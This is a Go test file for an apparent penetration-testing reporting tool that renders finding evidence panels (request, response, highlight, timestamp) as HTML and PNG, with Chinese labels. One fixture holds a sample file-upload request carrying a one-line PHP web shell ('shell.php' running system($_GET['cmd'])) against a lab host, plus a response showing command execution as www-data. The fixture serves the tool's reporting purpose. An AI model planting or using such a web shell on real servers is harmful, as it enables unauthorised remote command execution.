package evidence

import (
	"os"
	"strings"
	"testing"
	"time"
)

func TestShotSpecHTMLShowsClockAndHighlight(t *testing.T) {
	at := time.Date(2026, 10, 27, 17, 22, 52, 0, time.FixedZone("CST", 8*3600))
	spec := ShotSpec{
		Title:      "文件上传导致远程代码执行 · CRITICAL",
		Subtitle:   "POST /upload.php（multipart，avatar 字段）",
		Target:     "http://lab.example/upload.php",
		Request:    "POST /upload.php HTTP/1.1\r\nHost: lab.example\r\n\r\nbody",
		Response:   "HTTP/1.1 200 OK\r\n\r\nupload success uid=33(www-data)",
		HLStart:    len("HTTP/1.1 200 OK\r\n\r\nupload success "),
		HLEnd:      len("HTTP/1.1 200 OK\r\n\r\nupload success uid=33(www-data)"),
		HasHL:      true,
		Conclusion: "证明上传文件被解析执行",
		CapturedAt: at,
	}
	out := spec.HTML()
	for _, want := range []string{
		"17:22:52",    // 时分秒
		"2026年10月27日", // 公历年月日
		"星期二",         // 星期
		"<mark>uid=33(www-data)</mark>",
		"请求 REQUEST",
		"响应 RESPONSE",
		"证明上传文件被解析执行",
		"2026-10-27 17:22:52",
	} {
		if !strings.Contains(out, want) {
			t.Fatalf("panel missing %q", want)
		}
	}
	if strings.Contains(out, "九月") {
		t.Fatal("panel should not carry a lunar date")
	}
}

func TestShotSpecHTMLWithoutHighlight(t *testing.T) {
	spec := ShotSpec{Title: "x", Request: "GET / HTTP/1.1", Response: "HTTP/1.1 200 OK"}
	out := spec.HTML()
	if strings.Contains(out, "<mark>") {
		t.Fatal("no highlight expected")
	}
}

func TestUnescapeLines(t *testing.T) {
	// 传输层转义出来的字面 \r\n 要还原成真换行
	got := unescapeLines(`GET /a HTTP/1.1\r\nHost: x\r\n\r\nbody`)
	if !strings.Contains(got, "\r\n") {
		t.Fatalf("escaped newlines not restored: %q", got)
	}
	// 已经带真换行的内容原样保留（JSON 正文里的 \n 不能被改）
	raw := "HTTP/1.1 200 OK\r\n\r\n{\"a\":\"x\\ny\"}"
	if unescapeLines(raw) != raw {
		t.Fatal("text with real newlines must not be touched")
	}
	// 普通文本不受影响
	if unescapeLines("plain text") != "plain text" {
		t.Fatal("plain text changed")
	}
}

// TestRenderShotPNG renders a real panel when a Chromium is available; it also
// dumps the PNG so the layout can be eyeballed.
func TestRenderShotPNG(t *testing.T) {
	if findShotBrowser() == "" {
		t.Skip("no chromium available — skipping")
	}
	spec := ShotSpec{
		Title:      "文件上传导致远程代码执行 · CRITICAL",
		Subtitle:   "POST /upload.php（multipart，avatar 字段） · 前置：无需认证",
		Target:     "http://lab.example/upload.php",
		Request:    "POST /upload.php HTTP/1.1\r\nHost: lab.example\r\nContent-Type: multipart/form-data; boundary=--B\r\n\r\n------B\r\nContent-Disposition: form-data; name=\"avatar\"; filename=\"shell.php\"\r\n\r\n<?php system($_GET[\"cmd\"]); ?>\r\n------B--\r\n",
		Response:   "HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\n\r\nupload success: /uploads/avatar-1.php\r\nuid=33(www-data) gid=33(www-data) groups=33(www-data)",
		Conclusion: "证明上传目录 PHP 可直接解析执行",
		CapturedAt: time.Now(),
	}
	resp := spec.Response
	idx := strings.Index(resp, "uid=33(www-data)")
	if idx < 0 {
		t.Fatal("sample response lost the marker")
	}
	spec.HLStart, spec.HLEnd, spec.HasHL = idx, idx+len("uid=33(www-data) gid=33(www-data) groups=33(www-data)"), true

	png, err := RenderShotPNG(t.Context(), spec.HTML(), shotWidth, shotHeight)
	if err != nil {
		t.Fatalf("render: %v", err)
	}
	if len(png) < 5000 {
		t.Fatalf("png too small: %d bytes", len(png))
	}
	out := os.Getenv("JINGWEI_SHOT_OUT")
	if out == "" {
		out = "/tmp/jingwei-shot-panel.png"
	}
	if err := os.WriteFile(out, png, 0o644); err != nil {
		t.Fatal(err)
	}
	t.Logf("panel written to %s (%d bytes)", out, len(png))
}
